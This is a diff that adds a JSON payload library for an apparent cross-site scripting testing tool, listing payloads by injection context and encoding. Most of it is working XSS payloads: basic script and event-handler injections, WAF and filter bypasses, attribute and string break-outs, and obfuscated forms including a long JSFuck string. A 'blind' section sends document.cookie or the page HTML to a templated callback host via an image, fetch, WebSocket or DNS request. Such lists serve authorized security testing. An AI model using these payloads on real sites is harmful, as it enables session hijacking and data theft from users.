@@ -1,0 +1,279 @@
+{
+  "contexts": {
+    "html": {
+      "name": "HTML Context",
+      "description": "Payload will be inserted into HTML content"
+    },
+    "attribute": {
+      "name": "HTML Attribute",
+      "description": "Payload will be inserted into an HTML attribute"
+    },
+    "script": {
+      "name": "Script Context",
+      "description": "Payload will be inserted into JavaScript code"
+    },
+    "css": {
+      "name": "CSS Context",
+      "description": "Payload will be inserted into CSS styles"
+    },
+    "url": {
+      "name": "URL Context",
+      "description": "Payload will be part of a URL"
+    },
+    "comment": {
+      "name": "HTML Comment",
+      "description": "Payload will be inserted into HTML comments"
+    }
+  },
+  "encodings": {
+    "none": "No Encoding",
+    "url": "URL Encoding",
+    "html": "HTML Entities",
+    "unicode": "Unicode Escape",
+    "hex": "Hex Encoding"
+  },
+  "categories": {
+    "basic": {
+      "name": "Basic XSS Payloads",
+      "description": "Simple, commonly used XSS payloads for initial testing",
+      "payloads": [
+        {
+          "name": "Basic Alert",
+          "description": "Most basic XSS payload using script tags",
+          "contexts": ["html"],
+          "severity": "high",
+          "tags": ["basic", "script"],
+          "payload": "<script>alert(1)</script>"
+        },
+        {
+          "name": "Image OnError",
+          "description": "Uses image tag with onerror event handler",
+          "contexts": ["html"],
+          "severity": "high",
+          "tags": ["basic", "event-handler"],
+          "payload": "<img src=x onerror=alert(1)>"
+        },
+        {
+          "name": "SVG OnLoad",
+          "description": "SVG element with onload event",
+          "contexts": ["html"],
+          "severity": "high",
+          "tags": ["basic", "svg"],
+          "payload": "<svg onload=alert(1)>"
+        },
+        {
+          "name": "Input AutoFocus",
+          "description": "Input element that automatically focuses and triggers XSS",
+          "contexts": ["html"],
+          "severity": "high",
+          "tags": ["basic", "input"],
+          "payload": "<input autofocus onfocus=alert(1)>"
+        },
+        {
+          "name": "Body OnLoad",
+          "description": "Body tag with onload event handler",
+          "contexts": ["html"],
+          "severity": "high",
+          "tags": ["basic", "body"],
+          "payload": "<body onload=alert(1)>"
+        },
+        {
+          "name": "Iframe SrcDoc",
+          "description": "Iframe with embedded HTML in srcdoc attribute",
+          "contexts": ["html"],
+          "severity": "high",
+          "tags": ["basic", "iframe"],
+          "payload": "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>"
+        }
+      ]
+    },
+    "bypass": {
+      "name": "Filter Bypass Payloads",
+      "description": "Payloads designed to bypass common XSS filters and WAFs",
+      "payloads": [
+        {
+          "name": "Case Variation",
+          "description": "Mixed case to bypass case-sensitive filters",
+          "contexts": ["html"],
+          "severity": "medium",
+          "tags": ["bypass", "case"],
+          "payload": "<ScRiPt>alert(1)</ScRiPt>"
+        },
+        {
+          "name": "Double URL Encoding",
+          "description": "Double URL encoded payload to bypass filters",
+          "contexts": ["url", "attribute"],
+          "severity": "medium",
+          "tags": ["bypass", "encoding"],
+          "payload": "%253Cscript%253Ealert(1)%253C/script%253E"
+        },
+        {
+          "name": "HTML Entities",
+          "description": "HTML entity encoding to bypass basic filters",
+          "contexts": ["html", "attribute"],
+          "severity": "medium",
+          "tags": ["bypass", "entities"],
+          "payload": "&lt;script&gt;alert(1)&lt;/script&gt;"
+        },
+        {
+          "name": "Concatenation",
+          "description": "String concatenation in JavaScript context",
+          "contexts": ["script"],
+          "severity": "high",
+          "tags": ["bypass", "concat"],
+          "payload": "al\\\nert(1)"
+        },
+        {
+          "name": "Unicode Bypass",
+          "description": "Unicode characters to bypass keyword filters",
+          "contexts": ["html", "script"],
+          "severity": "medium",
+          "tags": ["bypass", "unicode"],
+          "payload": "<script>\\u0061lert(1)</script>"
+        },
+        {
+          "name": "Template Literals",
+          "description": "ES6 template literals for filter bypass",
+          "contexts": ["script"],
+          "severity": "high",
+          "tags": ["bypass", "es6"],
+          "payload": "`${alert(1)}`"
+        }
+      ]
+    },
+    "context": {
+      "name": "Context-Specific Payloads",
+      "description": "Payloads optimized for specific injection contexts",
+      "payloads": [
+        {
+          "name": "Attribute Break-out",
+          "description": "Break out of HTML attribute context",
+          "contexts": ["attribute"],
+          "severity": "high",
+          "tags": ["context", "attribute"],
+          "payload": "\" onmouseover=alert(1) \""
+        },
+        {
+          "name": "JavaScript String Escape",
+          "description": "Escape from JavaScript string context",
+          "contexts": ["script"],
+          "severity": "high",
+          "tags": ["context", "string"],
+          "payload": "';alert(1);//"
+        },
+        {
+          "name": "CSS Expression",
+          "description": "CSS expression for older IE browsers",
+          "contexts": ["css"],
+          "severity": "medium",
+          "tags": ["context", "css", "ie"],
+          "payload": "expression(alert(1))"
+        },
+        {
+          "name": "URL JavaScript Protocol",
+          "description": "JavaScript protocol in URL context",
+          "contexts": ["url"],
+          "severity": "high",
+          "tags": ["context", "url"],
+          "payload": "javascript:alert(1)"
+        },
+        {
+          "name": "Comment Break-out",
+          "description": "Break out of HTML comment context",
+          "contexts": ["comment"],
+          "severity": "medium",
+          "tags": ["context", "comment"],
+          "payload": "--><script>alert(1)</script><!--"
+        }
+      ]
+    },
+    "advanced": {
+      "name": "Advanced & Obfuscated",
+      "description": "Advanced payloads using obfuscation and encoding techniques",
+      "payloads": [
+        {
+          "name": "Base64 Decode",
+          "description": "Base64 encoded payload with decoding",
+          "contexts": ["html"],
+          "severity": "high",
+          "tags": ["advanced", "base64"],
+          "payload": "<script>eval(atob('YWxlcnQoMSk='))</script>"
+        },
+        {
+          "name": "DOM Manipulation",
+          "description": "Create script element via DOM manipulation",
+          "contexts": ["script"],
+          "severity": "high",
+          "tags": ["advanced", "dom"],
+          "payload": "var s=document.createElement('script');s.src='data:text/javascript,alert(1)';document.head.appendChild(s);"
+        },
+        {
+          "name": "JSFuck Obfuscation",
+          "description": "Heavily obfuscated JavaScript using only 6 characters",
+          "contexts": ["script"],
+          "severity": "high",
+          "tags": ["advanced", "obfuscation"],
+          "payload": "[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+([][[]]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(!![]+[])[+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]])()"
+        },
+        {
+          "name": "Function Constructor",
+          "description": "Use Function constructor to execute code",
+          "contexts": ["script"],
+          "severity": "high",
+          "tags": ["advanced", "constructor"],
+          "payload": "Function('alert(1)')()"
+        },
+        {
+          "name": "Event Handler Chain",
+          "description": "Chain multiple event handlers for stealth",
+          "contexts": ["html"],
+          "severity": "medium",
+          "tags": ["advanced", "chain"],
+          "payload": "<div onmouseover=\"this.onclick=function(){alert(1)}\" onclick=\"\">Hover then click</div>"
+        }
+      ]
+    },
+    "blind": {
+      "name": "Blind XSS Payloads",
+      "description": "Payloads for detecting XSS in contexts where you cannot see the output",
+      "payloads": [
+        {
+          "name": "Image Exfiltration",
+          "description": "Exfiltrate data via image request to external server",
+          "contexts": ["html", "script"],
+          "severity": "high",
+          "tags": ["blind", "exfiltration"],
+          "payload": "<script>new Image().src='http://{{callback}}/xss?'+document.cookie</script>",
+          "requires_callback": true
+        },
+        {
+          "name": "Fetch API Exfiltration",
+          "description": "Use fetch API to send data to external server",
+          "contexts": ["script"],
+          "severity": "high",
+          "tags": ["blind", "fetch"],
+          "payload": "fetch('http://{{callback}}/xss', {method:'POST', body: document.documentElement.outerHTML})",
+          "requires_callback": true
+        },
+        {
+          "name": "WebSocket Exfiltration",
+          "description": "Use WebSocket to send real-time data",
+          "contexts": ["script"],
+          "severity": "high",
+          "tags": ["blind", "websocket"],
+          "payload": "var ws=new WebSocket('ws://{{callback}}/ws');ws.onopen=function(){ws.send(document.cookie)}",
+          "requires_callback": true
+        },
+        {
+          "name": "DNS Exfiltration",
+          "description": "Exfiltrate via DNS queries (subdomain)",
+          "contexts": ["script"],
+          "severity": "medium",
+          "tags": ["blind", "dns"],
+          "payload": "fetch('http://'+btoa(document.cookie)+'.{{callback}}')",
+          "requires_callback": true
+        }
+      ]
+    }
+  }
+}
